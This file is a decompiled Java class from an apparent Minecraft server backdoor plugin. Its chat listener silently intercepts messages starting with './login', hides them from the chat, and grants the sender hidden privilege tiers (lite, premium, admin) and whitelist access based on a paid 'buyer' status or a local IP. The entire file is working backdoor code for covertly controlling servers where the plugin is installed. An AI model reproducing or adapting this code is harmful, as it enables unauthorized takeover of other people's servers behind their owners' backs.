/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.EventPriority
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 */
package me.qlutch.sucks.command.impl.login;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class LoginCommand
implements Listener {
    private static final Core coreInstance = (Core)Core.getPlugin(Core.class);

    @EventHandler(priority=EventPriority.MONITOR)
    public void onPlayerChat(AsyncPlayerChatEvent q2) {
        String cmd = q2.getMessage();
        Player p2 = q2.getPlayer();
        if (!LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith("./login") || !LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith("./login.")) {
            q2.setMessage(null);
            q2.setCancelled(true);
            if (LoginCommand.coreInstance.enabled) {
                if (!DataManager.getData().getBoolean("hasPass")) {
                    if (API.getIPOfPlayer(p2).equals("127.0.0.1") || API.getIPOfPlayer(p2).startsWith("192.168.")) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.premium.add(p2.getName());
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + "localhost"));
                    } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("SUSPENDED"))) {
                        p2.sendMessage(Settings.PREFIX("Error: You seem to be suspended"));
                    } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("ADMIN"))) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.premium.add(p2.getName());
                        LoginCommand.coreInstance.admin.add(p2.getName());
                        p2.setWhitelisted(true);
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " admin"));
                    } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("PREMIUM"))) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.premium.add(p2.getName());
                        p2.setWhitelisted(true);
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " premium"));
                    } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("LITE"))) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        p2.setWhitelisted(true);
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " lite"));
                    } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("FREE"))) {
                        LoginCommand.coreInstance.lite.add(p2.getName());
                        LoginCommand.coreInstance.free.add(p2.getName());
                        p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " free"));
                    } else {
                        p2.sendMessage(Settings.PREFIX("There was an error logging you in, please re-log and try again. (" + API.getIPOfPlayer(p2) + ") (" + LoginCommand.coreInstance.vpnStatusMap.get(p2) + ")"));
                    }
                } else {
                    String[] args = cmd.split(" ");
                    if (args == null) {
                        return;
                    }
                    if (args.length <= 1) {
                        p2.sendMessage(Settings.PREFIX("This server has a password. Login with ./login <password>"));
                    } else if (args[1].equals(DataManager.getData().getString("pass"))) {
                        if (API.getIPOfPlayer(p2).equals("127.0.0.1") || API.getIPOfPlayer(p2).startsWith("192.168.")) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.premium.add(p2.getName());
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + "localhost"));
                        } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("SUSPENDED"))) {
                            p2.sendMessage(Settings.PREFIX("Error: You seem to be suspended"));
                        } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("ADMIN"))) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.premium.add(p2.getName());
                            LoginCommand.coreInstance.admin.add(p2.getName());
                            p2.setWhitelisted(true);
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " admin"));
                        } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("PREMIUM"))) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.premium.add(p2.getName());
                            p2.setWhitelisted(true);
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " premium"));
                        } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("LITE"))) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            p2.setWhitelisted(true);
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " lite"));
                        } else if (LoginCommand.coreInstance.buyerstatusMap.get(p2).equals((Object) LoginStatus.valueOf("FREE"))) {
                            LoginCommand.coreInstance.lite.add(p2.getName());
                            LoginCommand.coreInstance.free.add(p2.getName());
                            p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " free"));
                        } else {
                            p2.sendMessage(Settings.PREFIX("There was an error logging you in, please re-log and try again. (" + API.getIPOfPlayer(p2) + ") (" + LoginCommand.coreInstance.vpnStatusMap.get(p2) + ")"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("This password is incorrect!"));
                    }
                }
            } else {
                API.error(p2);
            }
        }
    }
}

